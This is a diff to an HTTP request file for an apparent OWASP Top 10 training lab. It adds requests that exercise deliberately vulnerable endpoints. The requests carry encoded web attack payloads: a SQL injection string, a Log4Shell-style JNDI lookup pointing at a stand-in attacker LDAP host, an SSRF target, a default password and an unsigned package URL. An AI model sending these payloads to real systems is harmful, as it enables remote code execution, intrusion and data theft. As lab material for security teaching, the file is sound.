@@ -2,6 +2,9 @@
 @AliceId = 11111111-1111-1111-1111-111111111111
 @BobDocumentId = bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb
 @SqlInjectionPayload = %27%20OR%201%3D1%20--
+@ComponentPayload = %24%7Bjndi%3Aldap%3A%2F%2Fattacker%2Flab%7D
+@DefaultPassword = letmein
+@UnsignedPackageUrl = http%3A%2F%2Fupdates.local%2Funsigned-plugin.zip
 @SsrfTarget = http%3A%2F%2Flocalstack%3A4566%2F_localstack%2Fhealth
 
 GET {{SecureOpsLab.Api_HostAddress}}/health
@@ -20,6 +23,12 @@ X-Lab-User-Id: {{AliceId}}
 
 ###
 
+GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a02-cryptographic-failures/secrets/export
+Accept: application/json
+X-Lab-User-Id: {{AliceId}}
+
+###
+
 GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a03-injection/documents/search?term=Alice
 Accept: application/json
 X-Lab-User-Id: {{AliceId}}
@@ -32,7 +41,37 @@ X-Lab-User-Id: {{AliceId}}
 
 ###
 
+GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a04-insecure-design/emergency-access
+Accept: application/json
+X-Lab-User-Id: {{AliceId}}
+
+###
+
 GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a05-security-misconfiguration/objects/{{BobDocumentId}}
+Accept: application/json
+X-Lab-User-Id: {{AliceId}}
+
+###
+
+GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a06-vulnerable-components/render?payload={{ComponentPayload}}
+Accept: application/json
+X-Lab-User-Id: {{AliceId}}
+
+###
+
+GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a07-identification-authentication/default-login?password={{DefaultPassword}}
+Accept: application/json
+X-Lab-User-Id: {{AliceId}}
+
+###
+
+GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a08-software-data-integrity/update?packageUrl={{UnsignedPackageUrl}}
+Accept: application/json
+X-Lab-User-Id: {{AliceId}}
+
+###
+
+GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a09-logging-monitoring/admin-export
 Accept: application/json
 X-Lab-User-Id: {{AliceId}}
 
@@ -41,6 +80,14 @@ X-Lab-User-Id: {{AliceId}}
 GET {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/a10-ssrf/fetch?url={{SsrfTarget}}
 Accept: application/json
 X-Lab-User-Id: {{AliceId}}
+
+###
+
+PUT {{SecureOpsLab.Api_HostAddress}}/api/vulnerabilities/A02-CRYPTO/enabled
+Accept: application/json
+Content-Type: application/json
+
+{ "enabled": false }
 
 ###
 
